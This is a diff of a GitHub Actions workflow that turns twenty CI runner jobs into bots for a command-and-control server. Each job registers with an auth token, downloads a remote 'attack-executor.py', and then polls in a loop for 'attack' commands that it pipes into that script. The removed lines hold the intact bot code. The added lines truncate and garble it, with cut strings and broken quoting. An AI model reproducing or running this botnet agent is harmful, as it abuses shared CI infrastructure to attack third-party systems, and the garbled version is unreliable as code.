@@ -20,7 +20,7 @@ jobs:
     strategy:
       max-parallel: 20
       matrix:
-        slice: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        slice: [0,1,2,3,4,5,6,7,8,9,10,11,12
     steps:
       - name: Bot
         run: |
@@ -28,28 +28,29 @@ jobs:
           CPORT="${{ github.event.inputs.c2_port }}"
 
           BOT_ID="gh-${{ matrix.slice }}-$(head -c8 /dev/urandom | md5sum | cut -c1-8)"
-          LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+          LOCAL_IP=$(hostname -I 2>/dev/null
           [ -z "$LOCAL_IP" ] && LOCAL_IP="0.0.0.0"
 
           echo "[+] Bot ${BOT_ID} -> ${C2}:${CPORT}"
 
           curl -s -X POST "http://${C2}:${CPORT}/api/register" \
-            -H "Content-Type: application/json" \
-            -d '{"auth":"enibot2024","id":"'"${BOT_ID}"'","ip":"'"${LOCAL_IP}"'","hostname":"'"$(hostname)"'","os":"linux","arch":"x86_64","method":"python"}'
+            -H "Content-Type: application/js
+            -d '{"auth":"enibot2024","id":"'"${BOT_ID}"'","ip":"'"${LOCAL_IP}"'","hostname":"'"$(hostname)"'","os":"li
+nux","arch":"x86_64","method":"python"}'
 
-          curl -s "http://${C2}:${CPORT}/attack-executor.py" -o /tmp/executor.py
+          curl -s "http://${C2}:${CPORT}/attutor.py
 
           while true; do
             curl -s -X POST "http://${C2}:${CPORT}/api/heartbeat" \
-              -H "Content-Type: application/json" \
+              -H "Content-Type: application/
               -d '{"id":"'"${BOT_ID}"'"}' > /dev/null 2>&1
 
             CMDS=$(curl -s "http://${C2}:${CPORT}/api/poll?id=${BOT_ID}")
 
             if echo "${CMDS}" | grep -q '"type":"attack"'; then
-              export C2_URL="http://${C2}:${CPORT}"
+              export C2_URL="http://${C2}:${
               export BOT_ID="${BOT_ID}"
-              echo "${CMDS}" | python3 /tmp/executor.py
+              echo "${CMDS}" | python3 /tmp/
             fi
 
             sleep $((8 + RANDOM % 13))
